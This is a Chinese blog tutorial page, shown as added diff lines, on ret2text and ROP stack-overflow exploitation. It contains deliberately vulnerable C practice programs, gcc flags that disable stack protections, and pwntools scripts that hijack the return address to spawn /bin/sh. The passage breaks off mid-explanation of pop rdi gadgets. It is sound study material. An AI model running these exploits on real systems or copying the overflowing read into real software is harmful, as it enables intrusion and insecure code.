@@ -1,0 +1,466 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn入门-ret2text+ROP详解 | Matriy's blog</title><meta name="author" content="Matriy"><meta name="copyright" content="Matriy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="pwn入门-ret2text+ROP详解1234567#关闭栈保护gcc question_4_1.c -m32 -fno-stack-protector -o main#全部关闭gcc -no-pie -fno-stack-protector -z execstack -m32 -o 3.exe 3.c#-no-pie：地址随机化#-fno-stack-protector：没有堆栈保护#-z e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门-ret2text+ROP详解">
+<meta property="og:url" content="http://matriy330.github.io/be3a58d/index.html">
+<meta property="og:site_name" content="Matriy&#39;s blog">
+<meta property="og:description" content="pwn入门-ret2text+ROP详解1234567#关闭栈保护gcc question_4_1.c -m32 -fno-stack-protector -o main#全部关闭gcc -no-pie -fno-stack-protector -z execstack -m32 -o 3.exe 3.c#-no-pie：地址随机化#-fno-stack-protector：没有堆栈保护#-z e">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103182441795.png">
+<meta property="article:published_time" content="2025-01-05T12:29:13.000Z">
+<meta property="article:modified_time" content="2025-02-26T05:48:23.314Z">
+<meta property="article:author" content="Matriy">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103182441795.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pwn入门-ret2text+ROP详解",
+  "url": "http://matriy330.github.io/be3a58d/",
+  "image": "https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103182441795.png",
+  "datePublished": "2025-01-05T12:29:13.000Z",
+  "dateModified": "2025-02-26T05:48:23.314Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Matriy",
+      "url": "http://matriy330.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/bitbug_favicon.ico"><link rel="canonical" href="http://matriy330.github.io/be3a58d/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="G-ShTqjjywiLkL87Rg0PaiSsDVYymWStdQUO1wrM_VY"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":30,"languages":{"author":"作者: Matriy","link":"链接: ","source":"来源: Matriy's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}
+</script><link rel="stylesheet" href="/css/custom.css"><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pwn入门-ret2text+ROP详解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/cursor.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/music.css"><link rel="stylesheet" href="/css/comment.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="an_music_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">197</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Matriy's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">pwn入门-ret2text+ROP详解</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pwn入门-ret2text+ROP详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-05T12:29:13.000Z" title="发表于 2025-01-05 20:29:13">2025-01-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-26T05:48:23.314Z" title="更新于 2025-02-26 13:48:23">2025-02-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/be3a58d/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="pwn入门-ret2text-ROP详解"><a href="#pwn入门-ret2text-ROP详解" class="headerlink" title="pwn入门-ret2text+ROP详解"></a>pwn入门-ret2text+ROP详解</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭栈保护</span></span><br><span class="line">gcc question_4_1.c -m32 -fno-stack-protector -o main</span><br><span class="line"><span class="comment">#全部关闭</span></span><br><span class="line">gcc -no-pie -fno-stack-protector -z execstack -m32 -o 3.exe 3.c</span><br><span class="line"><span class="comment">#-no-pie：地址随机化</span></span><br><span class="line"><span class="comment">#-fno-stack-protector：没有堆栈保护</span></span><br><span class="line"><span class="comment">#-z execstack：堆栈可执行</span></span><br></pre></td></tr></table></figure>
+
+<p>ret2text 即控制程序执行程序本身已有的的代码 (即， <code>.text</code> 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<p>前置知识，栈溢出，程序栈</p>
+<p><strong>函数栈详解</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1i84y1d7mV/?spm_id_from=333.337.search-card.all.click&vd_source=d76ad0aadca055336653cd966075f064">https://www.bilibili.com/video/BV1i84y1d7mV/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d76ad0aadca055336653cd966075f064</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103182441795.png" alt="image-20250103182441795"></p>
+<h2 id="一、system-sh-情况"><a href="#一、system-sh-情况" class="headerlink" title="一、system(sh)情况"></a>一、system(sh)情况</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(sh);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">	<span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这时我们只需要栈溢出覆盖到返回地址即可，就能跳转到func函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>  </span><br><span class="line"><span class="comment">#padding = padding2ebp + context.word_size//8   #通过调试得到</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x08049182</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding + p32(return_addr)</span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*padding, return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250104145124271.png" alt="image-20250104145124271"></p>
+<h2 id="二、需要传入参数的情况"><a href="#二、需要传入参数的情况" class="headerlink" title="二、需要传入参数的情况"></a>二、需要传入参数的情况</h2><h3 id="（1）32位"><a href="#（1）32位" class="headerlink" title="（1）32位"></a>（1）32位</h3><p><strong>函数调用约定</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103164510940.png" alt="image-20250103164510940"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(cmd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>设想的情况是这样：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250104152602521.png" alt="image-20250104152602521"></p>
+<p>但是不行，因为函数的调用过程中call &#x3D; push eip;jump xxx和retn (pop eip)是一对的，我们所设置返回地址其实设置的是eip,关键还得看函数调用过程：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250104152801213.png" alt="image-20250104152801213"></p>
+<p>其实刚才那种布栈方式成功跳转了，但是参数传递失败，因为我们直接把返回地址修改，是没有call这个步骤，相当于我们后面要走那个程序，就直接push ebp,因为函数最后是需要返回的，除了我们需要填入的执行函数的地址外，还要填入这个函数执行完的返回地址（eip）,</p>
+<p>实际上是这样的(可以看开头的程序栈就知道了)：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250104155356539.png"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_2_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x08049182</span></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;func&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x804C024</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* padding + p32(return_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr)</span><br><span class="line"><span class="comment"># deadbeef随便某个地址就行</span></span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*padding, return_addr])</span></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）64位"><a href="#（2）64位" class="headerlink" title="（2）64位"></a>（2）64位</h3><p><strong>amd64位把参数放在寄存器中</strong></p>
+<blockquote>
+<p>前6个参数依次存放于rdi、rsi、rdx、rcx、r8r9 寄存器中第7个以后的参数存放于栈中</p>
+<p><strong>➡️ 在32位中，我们只需覆盖栈上的返回地址，然后依次伪造参数，指向<code>/bin/sh</code>和<code>system</code>，简单明了。</strong></p>
+<p><strong>x86_64 架构</strong>上，函数调用时，<strong>参数传递</strong>依赖于<strong>寄存器</strong>。具体规则如下：</p>
+<ul>
+<li><strong>第1个参数</strong> → <code>rdi</code></li>
+<li><strong>第2个参数</strong> → <code>rsi</code></li>
+<li><strong>第3个参数</strong> → <code>rdx</code></li>
+<li><strong>第4个参数</strong> → <code>rcx</code></li>
+<li><strong>第5个参数</strong> → <code>r8</code></li>
+<li><strong>第6个参数</strong> → <code>r9</code></li>
+<li><strong>超过6个参数</strong> → 通过栈传递</li>
+</ul>
+<p><strong>在系统调用中（如 <code>system()</code>）：</strong></p>
+<ul>
+<li><code>system()</code> 只有一个参数，通常是指向 <code>&quot;/bin/sh&quot;</code> 的字符串地址。</li>
+<li>在 64 位系统中，这个参数会被放在 <strong><code>rdi</code></strong> 中。</li>
+<li>因此，要调用 <code>system(&quot;/bin/sh&quot;)</code>，我们必须确保 <code>rdi</code> 寄存器中存储 <code>/bin/sh</code> 的地址。</li>
+</ul>
+<p><strong>➡️ 在64位中，调用<code>system(&quot;/bin/sh&quot;)</code>时，<code>/bin/sh</code>的地址必须放到<code>rdi</code>寄存器中，而不是栈中。</strong></p>
+</blockquote>
+<p>64位传参规则：先push参数三再参数2，再1，再eip，是往下写的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103165625846.png" alt="image-20250103165625846"></p>
+<p>负的是内部参数，正的是外部参数</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103165706572.png" alt="image-20250103165706572"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103165405350.png" alt="image-20250103165405350"></p>
+<p>只有一个参数，它也会显示4个</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250103170827233.png" alt="image-20250103170827233"></p>
+<p>如何给rdi赋值呢?需要用到rop编程：</p>
+<p>随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming),其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓gadgets就是以ret结尾的指令序列(只要用到rip的指令都是gadget)，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为ROP,是因为核心在于利用了指令集中的rt指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件：</p>
+<ol>
+<li><p>程序存在溢出，并且可以控制返回地址。</p>
+</li>
+<li><p>可以找到满足条件的gadgets以及相应gadgets的地址。</p>
+</li>
+</ol>
+<p>如果gadgets每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<p>国资社畜中间讲的很迷惑，我找GPT解释了下：</p>
+<p><strong><code>5D</code></strong> 和 <strong><code>41 5D</code></strong> 的区别：</p>
+<ul>
+<li><code>5D</code> 单独执行 → <code>pop rbp</code></li>
+<li><code>41 5D</code> 合并执行 → <code>pop r13</code></li>
+</ul>
+<p><strong>我们要实现的目标</strong></p>
+<ol>
+<li>将 <code>/bin/sh</code> 字符串的地址加载到 <code>rdi</code> 寄存器中。</li>
+<li>调用 <code>system()</code>，并将 <code>rdi</code> 作为 <code>system</code> 的参数。</li>
+</ol>
+<p>如何给rip赋值</p>
+<ol>
+<li>jmp rip</li>
+<li>ret(pop) rip</li>
+</ol>
+<p><strong>为什么使用 <code>pop rdi; ret</code>？</strong></p>
+<p><strong><code>pop rdi</code></strong></p>
+<ul>
+<li>从栈顶弹出一个值，存入 <code>rdi</code>。</li>
